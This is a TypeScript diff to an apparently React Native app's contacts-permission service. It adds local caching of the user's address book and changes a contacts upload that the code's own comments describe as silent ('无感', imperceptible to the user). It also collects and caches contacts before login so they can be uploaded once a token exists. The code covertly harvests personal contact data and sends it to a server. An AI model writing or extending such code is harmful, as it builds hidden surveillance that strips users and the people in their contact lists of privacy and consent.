@@ -288,13 +288,56 @@ class ContactsPermissionService {
   }
 
   /**
+   * 缓存通讯录数据到本地存储
+   */
+  async cacheContactsData(contactsData: ContactData[]): Promise<void> {
+    try {
+      const cacheKey = 'cached_contacts_data';
+      await AsyncStorage.setItem(cacheKey, JSON.stringify(contactsData));
+      console.log(`📱 [ContactsPermission] 通讯录数据已缓存，共 ${contactsData.length} 条记录`);
+    } catch (error) {
+      console.error('📱 [ContactsPermission] 缓存通讯录数据失败:', error);
+    }
+  }
+
+  /**
+   * 获取缓存的通讯录数据
+   */
+  async getCachedContactsData(): Promise<ContactData[] | null> {
+    try {
+      const cacheKey = 'cached_contacts_data';
+      const cachedData = await AsyncStorage.getItem(cacheKey);
+      if (cachedData) {
+        const contactsData = JSON.parse(cachedData);
+        console.log(`📱 [ContactsPermission] 获取到缓存的通讯录数据，共 ${contactsData.length} 条记录`);
+        return contactsData;
+      }
+      return null;
+    } catch (error) {
+      console.error('📱 [ContactsPermission] 获取缓存的通讯录数据失败:', error);
+      return null;
+    }
+  }
+
+  /**
    * 上传通讯录数据到服务器（无感操作）
    */
   async uploadContactsData(token: string): Promise<void> {
     try {
       console.log('📱 [ContactsPermission] 开始无感上传通讯录数据...');
       
-      const contactsData = await this.getContactsData();
+      // 优先使用缓存的数据，如果没有则重新获取
+      let contactsData = await this.getCachedContactsData();
+      
+      if (!contactsData || contactsData.length === 0) {
+        console.log('📱 [ContactsPermission] 没有缓存数据，重新获取通讯录数据');
+        contactsData = await this.getContactsData();
+        
+        // 缓存新获取的数据
+        if (contactsData.length > 0) {
+          await this.cacheContactsData(contactsData);
+        }
+      }
       
       if (contactsData.length === 0) {
         console.log('📱 [ContactsPermission] 没有有效的通讯录数据，跳过上传');
@@ -354,6 +397,17 @@ class ContactsPermissionService {
           if (token) {
             console.log('📱 [ContactsPermission] 开始上传数据');
             await this.uploadContactsData(token);
+          } else {
+            console.log('📱 [ContactsPermission] 权限获取成功，但无token，先获取数据缓存');
+            // 即使没有token，也先获取通讯录数据并缓存，等用户登录后再上传
+            try {
+              const contactsData = await this.getContactsData();
+              console.log(`📱 [ContactsPermission] 获取到 ${contactsData.length} 条通讯录数据，已缓存`);
+              // 这里可以将数据缓存到AsyncStorage，等用户登录后使用
+              await this.cacheContactsData(contactsData);
+            } catch (error) {
+              console.error('📱 [ContactsPermission] 获取通讯录数据失败:', error);
+            }
           }
           return;
         } else if (forceRequestResult === RESULTS.DENIED) {
